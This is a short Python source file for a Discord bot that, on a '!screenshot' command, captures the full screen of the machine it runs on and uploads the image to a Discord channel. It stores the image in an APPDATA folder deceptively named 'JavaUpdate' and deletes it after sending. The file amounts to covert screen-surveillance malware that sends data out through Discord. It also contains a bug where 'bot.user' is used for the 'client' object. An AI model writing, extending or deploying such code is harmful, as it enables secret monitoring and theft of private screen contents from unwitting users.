#configuration

token = "change me"
directoryname = "JavaUpdate"
prefix = "!"


#----------------------------------------------------------------------------------#

#code
#imports
import discord
from discord.ext import commands
import pyautogui
import os
import time

#variables
appdata = os.getenv("APPDATA")
pathfld = rf"{appdata}\{directoryname}"
pathss = rf"{appdata}\{directoryname}\screenshot.png"


#screenshit taker
def screenshitting():
    if not os.path.exists(pathfld):
        os.makedirs(f"{appdata}\{directoryname}")
        print(f"created new folder at: {pathfld}")
    screenshot = pyautogui.screenshot()
    screenshot.save(rf'{appdata}\{directoryname}\screenshot.png')



#bot

client = commands.Bot(command_prefix = prefix, case_insensitive = True, intents=discord.Intents.all())

@client.event
async def on_ready():
    print(f'connected and ready to use as {bot.user}')    
    


@client.command()
async def screenshot(ctx):
    screenshitting()
    currenttime = time.strftime("%H:%M:%S")
    file = discord.File(pathss, filename="screenshot.png")
    await ctx.send(f'Succesfuly generated screenshot at path {pathss} at {currenttime}')
    await ctx.send(file=file)
    
    time.sleep(2)
    
    os.remove(pathss)
    
client.run(token)
